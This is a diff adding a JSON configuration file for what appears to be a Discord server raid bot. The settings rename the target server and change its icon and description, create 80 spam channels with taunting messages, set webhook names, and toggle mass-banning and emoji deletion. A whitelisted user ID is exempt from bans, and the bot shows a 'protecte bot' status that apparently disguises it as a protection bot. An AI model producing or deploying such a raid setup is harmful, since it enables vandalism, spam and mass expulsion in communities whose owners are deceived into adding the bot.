@@ -1,0 +1,26 @@
+{
+    "SERVER_CONFIG": {
+        "new_name": "BHABHABHAB",
+        "new_icon": "https://img.1fichier.com/logo.png",
+        "new_description": "BAHBAHBAHBA EZZZ"
+    },
+    "WEBHOOK_CONFIG": {
+        "default_name": "jetz prenden22"
+    },
+    "AUTO_RAID_CONFIG": {
+        "num_channels": 80,
+        "channel_type": "text",
+        "channel_name": "GROSJE TETORDEN2",
+        "num_messages": 1,
+        "message_content": "FACILEEEE GROS",
+        "ban_all": false,
+        "delete_emojis": false
+    },
+    "NO_BAN_KICK_ID": [
+        470933233467523082
+    ],
+    "BOT_PRESENCE": {
+        "type": "streaming",
+        "text": "protecte bot"
+    }
+}
